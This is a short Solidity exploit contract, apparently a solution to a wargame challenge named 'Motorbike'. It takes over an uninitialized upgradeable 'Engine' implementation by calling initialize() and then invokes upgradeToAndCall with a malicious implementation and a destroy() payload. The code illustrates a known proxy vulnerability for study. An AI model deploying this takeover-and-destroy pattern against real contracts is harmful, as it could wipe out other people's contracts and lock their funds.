// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackMotorBike {

    Engine engine;

    constructor(address _engineAddress) {
        engine = Engine(_engineAddress);
    }

    function setUpgrader() public {
        engine.initialize();
    }

    function upgradeHack(address _badImplementation) public {
        engine.upgradeToAndCall(_badImplementation, abi.encodeWithSignature("destroy()"));
    }

}

contract Engine {
    function initialize() external {}
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {}

}